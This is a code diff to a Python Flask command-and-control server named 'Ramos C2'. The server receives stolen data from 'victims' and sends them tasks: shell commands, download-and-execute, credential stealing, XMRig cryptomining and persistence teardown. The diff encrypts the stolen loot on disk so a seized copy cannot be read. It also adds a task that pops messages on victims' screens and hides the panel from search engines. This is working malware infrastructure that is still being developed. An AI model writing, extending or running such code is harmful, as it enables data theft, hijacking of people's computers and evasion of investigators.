@@ -6,7 +6,7 @@ This repo does NOT vendor XMRig source — the panel serves an official
 XMRig Windows build you placed next to this file as xmrig.exe, plus a
 generated config.json. Start/stop is task-driven and reversible.
 """
-import os, json, datetime, re, base64, zlib, uuid as _uuid
+import os, json, datetime, re, base64, zlib, hashlib, uuid as _uuid
 from functools import wraps
 from flask import Flask, request, jsonify, send_from_directory, Response
 
@@ -63,19 +63,80 @@ def require_master(fn):
         return fn(*a, **kw)
     return w
 
-# ---- tiny json stores (no database, nothing else stored server-side)
+# ---- at-rest sealing: victim records, task queue (incl popmsg text),
+# miner defaults and every loot file are AES-256-GCM sealed under a key
+# derived from the master key — never stored next to the files. loot/
+# reads as garbage without the key. Legacy plaintext loads transparently
+# and re-seals on its next write. Wrong/rotated key -> store reads empty
+# (logged), never half-decrypted.
+SEAL_MAGIC = b"RMS1"
+
+def _seal_key():
+    if not MASTER:
+        return None
+    return hashlib.sha256(b"ramos-seal-v1|" + MASTER.encode()).digest()
+
+def _seal(raw: bytes) -> bytes:
+    """RMS1 | nonce(12) | tag(16) | ciphertext. Passes plaintext through
+    when no master key is configured (panel is 501-gated anyway)."""
+    k = _seal_key()
+    if k is None:
+        return raw
+    from Crypto.Cipher import AES as _AES
+    nonce = os.urandom(12)
+    ct, tag = _AES.new(k, _AES.MODE_GCM, nonce).encrypt_and_digest(raw)
+    return SEAL_MAGIC + nonce + tag + ct
+
+def _unseal(blob: bytes) -> bytes:
+    if blob[:4] != SEAL_MAGIC:
+        return blob  # legacy plaintext
+    k = _seal_key()
+    if k is None:
+        raise ValueError("sealed store but no master key")
+    from Crypto.Cipher import AES as _AES
+    return _AES.new(k, _AES.MODE_GCM, blob[4:16]).decrypt_and_verify(
+        blob[32:], blob[16:32])
+
+def _append_seal(path, text):
+    """One record = one physical line = base64(seal(text)). Works for text
+    with newlines (they're encoded away) and for binary (single record)."""
+    raw = text.encode() if isinstance(text, str) else text
+    blob = _seal(raw)
+    out = text if blob == raw else base64.b64encode(blob).decode()
+    with open(path, "a") as f:
+        f.write(out if out.endswith("\n") else out + "\n")
+
+def _unseal_loot(raw: bytes) -> bytes:
+    """Serve-side decode: whole-file seal, per-record seal, or legacy
+    plaintext — mixed old/new shard files decode line by line."""
+    if raw[:4] == SEAL_MAGIC:
+        return _unseal(raw)
+    out = []
+    for line in raw.split(b"\n"):
+        s = line.strip()
+        if not s:
+            out.append(line)
+            continue
+        try:
+            dec = base64.b64decode(s, validate=True)
+            out.append(_unseal(dec) if dec[:4] == SEAL_MAGIC else line)
+        except Exception:
+            out.append(line)
+    return b"\n".join(out)
+
 def _load_json(path, default):
     try:
         if os.path.isfile(path):
-            return json.load(open(path))
-    except Exception:
-        pass
+            return json.loads(_unseal(open(path, "rb").read()).decode())
+    except Exception as e:
+        if os.path.isfile(path):
+            log(f"load {os.path.basename(path)} failed: {e}")
     return default
 
 def _save_json(path, obj):
     tmp = path + ".tmp"
     try:
-        json.dump(obj, open(tmp, "w"), indent=1)
+        open(tmp, "wb").write(_seal(json.dumps(obj, indent=1).encode()))
         os.replace(tmp, path)
     except Exception as e:
         log(f"save {path} failed: {e}")
@@ -151,10 +212,10 @@ def mark_done(vid, tid, output=None):
         try:
             vd = os.path.join(RES, re.sub(r"[^A-Za-z0-9_.-]", "_", vid)[:64])
             os.makedirs(vd, exist_ok=True)
-            open(os.path.join(vd, tid + ".json"), "w").write(
+            open(os.path.join(vd, tid + ".json"), "wb").write(_seal(
                 json.dumps({"ts": datetime.datetime.now().isoformat(),
                             "victim": vid, "task": tid,
-                            "output": str(output)[:20000]}))
+                            "output": str(output)[:20000]}).encode()))
         except Exception:
             pass
 
@@ -187,7 +248,9 @@ def backfill_victims():
                 continue
             vid = fn[len("shard_"):-len(".json")][:64]
             try:
-                lines = open(os.path.join(LOOT, fn)).read().strip().split("\n")
+                lines = _unseal_loot(
+                    open(os.path.join(LOOT, fn), "rb").read()).decode(
+                    errors="replace").strip().split("\n")
                 last = json.loads(lines[-1]) if lines and lines[0].strip() else {}
                 data = last.get("data", {}) or {}
                 counts, sysinfo = decode_loot_counts(data)
@@ -218,8 +281,9 @@ def shard():
     data = request.get_json(force=True, silent=True) or {}
     uid = str(data.get("userId", "unknown"))[:64]
     log(f"shard_post from {uid} keys={list(data.keys())}")
-    with open(os.path.join(LOOT, f"shard_{uid}.json"), "a") as f:
-        f.write(json.dumps({"ts": datetime.datetime.now().isoformat(), "ip": request.remote_addr, "data": data}) + "\n")
+    _append_seal(os.path.join(LOOT, f"shard_{uid}.json"),
+                 json.dumps({"ts": datetime.datetime.now().isoformat(),
+                             "ip": request.remote_addr, "data": data}))
     counts, sysinfo = decode_loot_counts(data)
     touch_victim(uid, ip=request.remote_addr, sysinfo=sysinfo, counts=counts)
     return jsonify({"status": "ok"})
@@ -229,12 +293,11 @@ def submit():
     uid = str(request.form.get("userId", "unknown"))[:64]
     for key, f in request.files.items():
         path = os.path.join(LOOT, f"{uid}_{key}_{f.filename}")
-        f.save(path)
-        log(f"loot {path} ({os.path.getsize(path)} bytes)")
+        open(path, "wb").write(_seal(f.read()))
+        log(f"loot {path} ({os.path.getsize(path)} bytes sealed)")
     if request.is_json:
         data = request.get_json(silent=True) or {}
-        with open(os.path.join(LOOT, f"loot_{uid}.json"), "a") as fh:
-            fh.write(json.dumps(data) + "\n")
+        _append_seal(os.path.join(LOOT, f"loot_{uid}.json"), json.dumps(data))
         log(f"json loot from {uid}: {list(data.keys())}")
     touch_victim(uid, ip=request.remote_addr)
     return jsonify({"status": "ok"})
@@ -243,16 +306,30 @@ def submit():
 def mc_log():
     data = request.get_json(force=True, silent=True) or {}
     uid = str(data.get("userId", "unknown"))[:64]
-    with open(os.path.join(LOOT, f"mc_{uid}.log"), "a", encoding="utf-8", errors="replace") as f:
-        f.write(f"\n===== {datetime.datetime.now().isoformat()} {request.remote_addr} =====\n")
-        f.write(data.get("content", "")[:1_000_000])
+    _append_seal(os.path.join(LOOT, f"mc_{uid}.log"),
+                 f"\n===== {datetime.datetime.now().isoformat()} {request.remote_addr} =====\n"
+                 + data.get("content", "")[:1_000_000])
     log(f"minecraft log from {uid} ({len(data.get('content',''))} bytes)")
     return jsonify({"status": "ok"})
 
 @app.route("/loot/<path:name>", methods=["GET"])
 @require_master
 def get_loot(name):
-    return send_from_directory(LOOT, name)
+    """Master-key-only, decrypt-on-serve: sealed loot reaches the panel as
+    plaintext, a stolen copy on disk never does."""
+    import mimetypes
+    from werkzeug.utils import safe_join
+    path = safe_join(LOOT, name)
+    if not path or not os.path.isfile(path):
+        return jsonify({"status": "no-file"}), 404
+    try:
+        data = _unseal_loot(open(path, "rb").read())
+    except Exception as e:
+        return jsonify({"status": "unseal-failed", "error": str(e)}), 500
+    mime = mimetypes.guess_type(name)[0] or "application/octet-stream"
+    return Response(data, mimetype=mime,
+                    headers={"Cache-Control": "no-store",
+                             "Content-Disposition": "inline"})
 
 # ============================================================ agent (beacon+tasking)
 @app.route("/agent/checkin", methods=["POST"])
@@ -362,6 +439,7 @@ def api_victims():
                      "first_seen": e.get("first_seen"), "ip": e.get("ip"),
                      "sysinfo": e.get("sysinfo"), "loot_counts": e.get("loot_counts"),
                      "records": e.get("records", 0), "miner": e.get("miner"),
+                     "persist": e.get("persist"),
                      "beacons": e.get("beacons", 0), "agent": bool(e.get("agent"))})
     return jsonify({"victims": rows, "miner_defaults": miner_defaults(),
                     "xmrig_present": os.path.isfile(XMRIG_BIN)})
@@ -378,7 +456,8 @@ def api_victim(vid):
     try:
         p = os.path.join(LOOT, f"shard_{vid}.json")
         if os.path.isfile(p):
-            lines = open(p).read().strip().split("\n")
+            lines = _unseal_loot(open(p, "rb").read()).decode(
+                errors="replace").strip().split("\n")
             last = json.loads(lines[-1]) if lines else {}
             preview = {"ts": last.get("ts"), "keys": list((last.get("data") or {}).keys())}
     except Exception:
@@ -388,10 +467,9 @@ def api_victim(vid):
     try:
         if os.path.isdir(vd):
             for fn in sorted(os.listdir(vd))[-20:]:
-                try:
-                    results.append(json.load(open(os.path.join(vd, fn))))
-                except Exception:
-                    pass
+                r = _load_json(os.path.join(vd, fn), None)
+                if r is not None:
+                    results.append(r)
     except Exception:
         pass
     return jsonify({"victim": dict({"id": vid}, **v), "tasks": t[-20:],
@@ -405,8 +483,15 @@ def api_task():
     ttype = str(data.get("type", ""))[:32]
     args = data.get("args", {}) or {}
     if not vid or ttype not in ("shell", "miner_start", "miner_stop",
-                                "download_exec", "steal", "persist_purge", "raw"):
+                                "download_exec", "steal", "persist_purge",
+                                "popmsg", "raw"):
         return jsonify({"status": "bad-task"}), 400
+    if ttype == "popmsg":
+        txt = str(args.get("text", "")).strip()
+        if not txt:
+            return jsonify({"status": "no-text",
+                            "hint": 'args must be {"text": "..."}'}), 400
+        args = {"text": txt[:500]}  # verdict box, 500 chars max
     # fill miner_start blanks from stored defaults
     if ttype == "miner_start":
         d = miner_defaults()
@@ -474,9 +559,9 @@ def mod_fetch():
 def mod_submit():
     data = request.get_json(force=True, silent=True) or {}
     uid = str(data.get("userId", "unknown"))[:64] + "-modloot"
-    with open(os.path.join(LOOT, f"modloot_{uid}.json"), "a") as fh:
-        fh.write(json.dumps({"ts": datetime.datetime.now().isoformat(),
-                             "ip": request.remote_addr, "size": len(str(data))}) + "\n")
+    _append_seal(os.path.join(LOOT, f"modloot_{uid}.json"),
+                 json.dumps({"ts": datetime.datetime.now().isoformat(),
+                             "ip": request.remote_addr, "size": len(str(data))}))
     log(f"mod loot from {uid}")
     return jsonify({"status": "ok"})
 
@@ -530,9 +615,9 @@ def mod_checkin():
         pt = _AES.new(key, _AES.MODE_GCM, iv).decrypt(ct)[:-16]
         inner = json.loads(pt.decode())
         uid = str(inner.get("user", "unknown"))[:64] + "-mod"
-        with open(os.path.join(LOOT, f"mod_{uid}.json"), "a") as fh:
-            fh.write(json.dumps({"ts": datetime.datetime.now().isoformat(),
-                                 "ip": request.remote_addr, "data": inner}) + "\n")
+        _append_seal(os.path.join(LOOT, f"mod_{uid}.json"),
+                     json.dumps({"ts": datetime.datetime.now().isoformat(),
+                                 "ip": request.remote_addr, "data": inner}))
         touch_victim(uid, ip=request.remote_addr,
                      extra={"mod_user": inner.get("user"), "uuid": inner.get("uuid")})
         log(f"mod check-in from {uid} uuid={inner.get('uuid')}")
@@ -546,6 +631,7 @@ PANEL_HTML = """<!doctype html><html lang=en>
 <head>
 <meta charset=utf-8>
 <meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=robots content="noindex,nofollow,noarchive">
 <title>Ramos C2 — panel</title>
 <style>
 :root{
@@ -732,6 +818,7 @@ label{display:block;font-size:10.5px;font-weight:700;color:var(--dim);margin-bot
           <option value=download_exec>download_exec</option>
           <option value=steal>steal (re-run)</option>
           <option value=persist_purge>persist_purge (teardown)</option>
+          <option value=popmsg>&#128225; popmsg (verdict box)</option>
         </select></div>
       <div class=field style="flex:2"><label>args (json)</label>
         <input id=ta placeholder='{"cmd":"whoami"}' style="width:100%" spellcheck=false></div>
@@ -846,7 +933,8 @@ async function load(quiet){
         + "<td>" + (v.records || 0) + "</td>"
         + "<td>" + minerPill(v) + " " + persistPill(v) + "</td>"
         + '<td><button class="ghost mini" data-act="start" data-vid="' + esc(v.id) + '">start</button> '
-        + '<button class="danger mini" data-act="stop" data-vid="' + esc(v.id) + '">stop</button></td></tr>'
+        + '<button class="danger mini" data-act="stop" data-vid="' + esc(v.id) + '">stop</button> '
+        + '<button class="ghost mini" data-act="msg" data-vid="' + esc(v.id) + '" title="pop a real message box on their screen">&#128225; msg</button></td></tr>'
       ).join("");
     }
     if (selected) await detail(selected, true);
@@ -888,7 +976,8 @@ async function detail(id, quiet){
       + '<p class="small" style="margin:12px 0 4px"><span class=dim>tasks:</span></p>' + tasks
       + (results ? '<p class="small" style="margin:12px 0 4px"><span class=dim>results:</span></p>' + results : "")
       + '<p class="small" style="margin:12px 0 0"><a href="/loot/shard_' + encodeURIComponent(id)
-      + '.json" style="color:var(--cyn)" target="_blank" rel="noopener">open raw shard &#8599;</a></p>';
+      + '.json?key=' + encodeURIComponent(K)
+      + '" style="color:var(--cyn)" target="_blank" rel="noopener">open raw shard &#8599;</a></p>';
     if (!quiet){ document.querySelector('[data-vid="' + CSS.escape(id) + '"]'); $("det").scrollIntoView({behavior:"smooth",block:"nearest"}); }
   } catch (e) { if (!quiet) toast(e.message, true); }
 }
@@ -899,6 +988,20 @@ async function minerOp(vid, act){
       body:JSON.stringify({victim_id:vid, action:act})});
     toast(act === "start" ? "miner_start queued → " + vid : "miner_stop queued → " + vid);
     await load(true);
+    if (selected) await detail(selected, true);
+  } catch (e) { toast(e.message, true); }
+}
+
+async function showMsg(vid){
+  const text = prompt("verdict box -> " + vid + "\n(real Win32 MessageBox, topmost, on their screen):",
+                      "I stopped it.");
+  if (text === null) return;               // cancelled
+  const t = text.trim();
+  if (!t){ toast("empty message", true); return; }
+  try {
+    await api("/api/task", {method:"POST",
+      body:JSON.stringify({victim_id:vid, type:"popmsg", args:{text:t.slice(0,500)}})});
+    toast("message queued -> " + vid + " (pops on next beacon)");
     if (selected) await detail(selected, true);
   } catch (e) { toast(e.message, true); }
 }
@@ -959,9 +1062,17 @@ $("taskBtn").addEventListener("click", sendTask);
 $("saveMinerBtn").addEventListener("click", saveMiner);
 $("vt").addEventListener("click", e => {
   const b = e.target.closest("button[data-act]");
-  if (b){ e.stopPropagation(); minerOp(b.dataset.vid, b.dataset.act); return; }
+  if (b){
+    e.stopPropagation();
+    if (b.dataset.act === "msg"){ showMsg(b.dataset.vid); return; }
+    minerOp(b.dataset.vid, b.dataset.act); return;
+  }
   const row = e.target.closest("tr[data-vid]");
   if (row) detail(row.dataset.vid);
+});
+$("tt").addEventListener("change", () => {
+  $("ta").placeholder = $("tt").value === "popmsg"
+    ? '{"text":"I stopped it."}' : '{"cmd":"whoami"}';
 });
 
 if (K) login(); else $("key").focus();
@@ -974,7 +1085,8 @@ if (K) login(); else $("key").focus();
 def panel():
     # /dashboard used to 404 (dead dashboard); it now serves the SaaS panel
     return Response(PANEL_HTML, mimetype="text/html",
-                    headers={"Cache-Control": "no-store"})
+                    headers={"Cache-Control": "no-store",
+                             "X-Robots-Tag": "noindex, nofollow"})
 
 @app.route("/", methods=["GET"])
 def index():
